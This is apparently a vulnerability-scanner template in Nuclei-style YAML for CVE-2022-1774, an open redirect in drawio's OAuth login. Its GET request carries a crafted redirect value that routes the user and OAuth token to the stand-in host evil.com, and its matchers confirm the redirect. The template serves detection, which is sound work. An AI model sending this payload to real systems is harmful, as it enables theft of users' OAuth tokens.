id: CVE-2022-1774

info:
  name: Exposure of Sensitive Information via Redirect in drawio
  author: ProjectDiscoveryAI
  severity: medium
  description: The vulnerability allows an attacker to bypass the protection of the redirect parameter and redirect the user and OAuth token to an attacker-controlled site.
  impact: |
    An attacker could exploit this vulnerability to redirect users to malicious websites and steal sensitive information.
  remediation: |
    Ensure that all redirects in the drawio application are properly validated and sanitized to prevent open redirects.

http:
  - method: GET
    path:
      - "{{BaseURL}}/login/oauth/authorize?client_id=Iv1.98d62f0431e40543&state=cId%3DIv1.98d62f0431e40543%26domain%3Dapp.diagrams.net%26redirect%3dhttps%3a%2f%2f%20%40evil.com%2f%26token%3Dplrpdrqccuavr39ta3h5bcmjoghhk2le7tdiflbm3ljpe4tdqj"

    matchers:
      - type: status
        status:
          - 302

      - type: word
        part: header
        words:
          - "Location: https://@evil.com/"
        condition: and
